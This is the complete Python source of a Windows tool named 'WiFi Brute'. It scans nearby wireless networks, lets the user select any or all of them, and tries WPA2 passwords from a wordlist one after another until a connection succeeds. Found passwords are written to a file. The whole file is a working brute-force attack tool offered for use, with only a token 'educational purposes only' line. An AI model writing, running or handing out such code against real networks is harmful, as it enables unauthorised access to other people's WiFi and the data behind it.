import os, re, sys, time, ctypes, argparse, platform, threading, collections
from datetime import timedelta
from utils import Colors, banner, clear, sprint, print_header, get_input, print_table, print_status, print_progress_bar, confirm_action, gradient_print, get_terminal_size

REQUIRED_PACKAGES = {'keyboard', 'pywifi', 'tqdm', 'colorama'}

for package in REQUIRED_PACKAGES:
    try:
        __import__(package)
    except ModuleNotFoundError:
        print(f"{package} not found. Installing...")
        os.system(f"pip install {package}")

import pywifi, keyboard
from pywifi import const
from tqdm import tqdm

DEFAULT_WORDLIST = "passwords.txt"
CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
ATTEMPTED_PASSWORDS_FILE = "attempted_passwords.txt"
DEFAULT_TIMEOUT = 15

class WifiCracker:
    def __init__(self, interface, timeout, wordlist):
        self.interface = interface
        self.timeout = timeout
        self.passwords = self.load_passwords(wordlist)
        self.cracked_passwords = self.load_history(CRACKED_PASSWORDS_FILE)
        self.attempted_passwords = self.load_history(ATTEMPTED_PASSWORDS_FILE)
        self.paused = False
        self.stop_cracking = False
        self.current_ssid = ""
        self.current_password = ""
        self.idx = 0
        self.total_passwords = 0

    @staticmethod
    def load_passwords(wordlist):
        with open(wordlist, encoding="UTF-8", errors="ignore") as f:
            return [x.strip() for x in f if x.strip()]

    @staticmethod
    def load_history(filename):
        history = collections.defaultdict(set)
        if os.path.exists(filename):
            with open(filename) as f:
                for line in f:
                    ssid, password = line.strip().split("--")
                    history[ssid].add(password)
        return history

    @staticmethod
    def save_to_history(filename, ssid, password):
        with open(filename, "a") as f:
            f.write(f"{ssid}--{password}\n")

    def scan_wifi(self):
        def perform_scan():
            print_status("Scanning for WiFi networks", "IN PROGRESS")
            with tqdm(total=100, bar_format="{l_bar}{bar}", colour='cyan', desc="Scanning") as pbar:
                self.interface.scan()
                for _ in range(100):
                    time.sleep(0.04)
                    pbar.update(1)
                return self.interface.scan_results()
        try:
            networks = perform_scan()
        except ValueError:
            print_status("Turning on Wi-Fi", "WAIT")
            os.system("powershell -File TurnWiFiOn.ps1")
            time.sleep(10)
            networks = perform_scan()

        print_status("WiFi scan completed", "SUCCESS")
        return networks

    def connect_to_wifi(self, ssid, password, is_hidden=False):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        profile.hidden = is_hidden
        self.interface.remove_all_network_profiles()
        tmp_profile = self.interface.add_network_profile(profile)
        self.interface.connect(tmp_profile)
        start_time = time.time()
        while time.time() - start_time < self.timeout:
            if self.stop_cracking:
                return False
            if self.paused:
                self.interface.disconnect()
                return None
            if self.interface.status() == const.IFACE_CONNECTED:
                return True
            time.sleep(0.1)
        return False

    def crack_wifi(self, ssid, is_hidden=False):
        if ssid in self.cracked_passwords:
            print_status(f"Password already found for {ssid}: {next(iter(self.cracked_passwords[ssid]))}", "SUCCESS")
            return next(iter(self.cracked_passwords[ssid]))

        self.current_ssid = ssid
        self.total_passwords = len(self.passwords)

        print_header(f"Cracking {ssid}")
        terminal_width = get_terminal_size()[0]
        
        self.idx = 0
        while self.idx < self.total_passwords:
            if terminal_width != get_terminal_size()[0]:
                clear()
                terminal_width = get_terminal_size()[0]
            if self.stop_cracking:
                return None
            
            self.current_password = self.passwords[self.idx]
            
            if ssid in self.attempted_passwords and self.current_password in self.attempted_passwords[ssid]:
                self.idx += 1
                continue
            
            if not self.paused:
                self.print_status_line()

            while self.paused:
                time.sleep(0.1)
                if self.stop_cracking:
                    return None

            result = self.connect_to_wifi(ssid, self.current_password, is_hidden)
            
            if result is None:
                continue
            
            if self.stop_cracking:
                return None
            
            self.save_to_history(ATTEMPTED_PASSWORDS_FILE, ssid, self.current_password)
            if result:
                self.attempted_passwords[ssid].add(self.current_password)
                print_status(f"Password found for {ssid}: {self.current_password}", "SUCCESS", start_color='#A020F0')
                return self.current_password

            self.idx += 1

        print_status(f"No password found for {ssid}", "FAILED", success=False)
        return None

    def print_status_line(self):
        eta = timedelta(seconds=int((self.total_passwords - self.idx) * (self.timeout + 0.1)))
        print_progress_bar(
            self.idx + 1, self.total_passwords,
            prefix=f"Progress ({self.current_ssid}):",
            suffix=f"Current password: {self.current_password} | ETA: {eta}      \r"
        )

    def handle_keyboard_input(self):
        while not self.stop_cracking:
            if keyboard.is_pressed('p'):
                self.paused = not self.paused
                clear()
                print(f'\n{Colors.YELLOW}{"Paused" if self.paused else "Resumed"} [{Colors.GREEN}p{Colors.YELLOW}]\n')
                if not self.paused:
                    self.print_status_line()
                time.sleep(0.2)
            elif keyboard.is_pressed('q'):
                self.stop_cracking = True
                if not self.paused:
                    print("\n")
                break
            time.sleep(0.1)

def check_privileges():
    if platform.system() != "Windows":
        print_status("Sorry, only made for Windows :(", "ERROR", success=False)
        time.sleep(3)
        sys.exit(1)

    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        print_status("Administrative privileges", "DETECTED")
    else:
        print_status("Run as administrator for better performance", "WARNING", success=False)
    time.sleep(2)

def display_networks(networks):
    headers = ["ID", "SSID", "Signal Strength"]
    rows = []
    hidden_count = 0
    for i, network in enumerate(networks, 1):
        if network.ssid:
            rows.append([str(i), network.ssid, str(network.signal)])
        else:
            hidden_count += 1
            rows.append([str(i), f"Hidden Network {hidden_count}", str(network.signal)])
    print_table(headers, rows)

def select_networks(networks):
    display_networks(networks)
    while True:
        selected = get_input("\nEnter the ID number(s) of the network(s) you want to crack (comma-separated) or 'all': ").strip().lower()
        
        if selected == 'all':
            return networks
        
        cleaned_input = re.sub(r'\s*,\s*', ',', selected)
        cleaned_input = re.sub(r',+', ',', cleaned_input)
        
        selections = cleaned_input.split(',')
        
        try:
            indices = [int(x) - 1 for x in selections if x]
            selected_networks = [networks[i] for i in indices if 0 <= i < len(networks)]
            
            if not selected_networks:
                print_status("No valid networks selected. Please try again.", "ERROR", success=False)
                continue
            
            for i in indices:
                if i < 0 or i >= len(networks):
                    print_status(f"Network ID {i+1} is out of range and will be skipped.", "WARNING", success=False)
            
            return selected_networks
        except ValueError:
            print_status("Invalid input. Please enter valid ID number(s) or 'all'", "ERROR", success=False)

def main():
    parser = argparse.ArgumentParser(description="WiFi Brute Force Tool")
    parser.add_argument("-w", "--wordlist", default=DEFAULT_WORDLIST, help="Path to the wordlist file")
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT, help="Timeout for each connection attempt")
    args = parser.parse_args()

    check_privileges()
    clear()
    banner(show_logo=True)
    sprint("Note: This tool is for educational purposes only.", delay=0.0008)
    time.sleep(1)
    clear()
    banner(show_logo=True)

    interface = pywifi.PyWiFi().interfaces()[0]
    cracker = WifiCracker(interface, args.timeout, args.wordlist)

    while True:
        networks = cracker.scan_wifi()
        networks = sorted({network.ssid: network for network in networks}.values(), key=lambda x: x.signal, reverse=True)
        print_status(f"Number of unique WiFi networks found: {len(networks)}", "INFO")
        
        selected_networks = select_networks(networks)
        if not confirm_action("Start cracking?"):
            clear()
            continue

        clear()
        print_header("Cracking Shortcuts")
        sprint("Press 'p' to pause/unpause.", delay=0.0005)
        sprint("Press 'q' to stop cracking.", delay=0.0005)
        
        keyboard_thread = threading.Thread(target=cracker.handle_keyboard_input)
        keyboard_thread.start()

        hidden_count = 0
        for i, network in enumerate(selected_networks, 1):
            if cracker.stop_cracking:
                break
            
            ssid = network.ssid or f"Hidden Network {hidden_count + 1}"
            hidden_count += 1
            password = cracker.crack_wifi(ssid, not network.ssid)
            if password:
                if ssid not in cracker.cracked_passwords:
                    cracker.cracked_passwords[ssid] = {password}
                    cracker.save_to_history(CRACKED_PASSWORDS_FILE, ssid, password)
            
            if i < len(selected_networks) and not cracker.stop_cracking:
                if not confirm_action("Continue cracking the next network?"):
                    break

        cracker.stop_cracking = True
        keyboard_thread.join()
        
        if not confirm_action("Scan for networks again?"):
            break

        clear()
        banner(show_logo=True)
        cracker.paused = False
        cracker.stop_cracking = False

    clear()
    banner(show_logo=True)
    gradient_print("Thank you for using WiFi Brute. Goodbye!")

if __name__ == "__main__":
    main()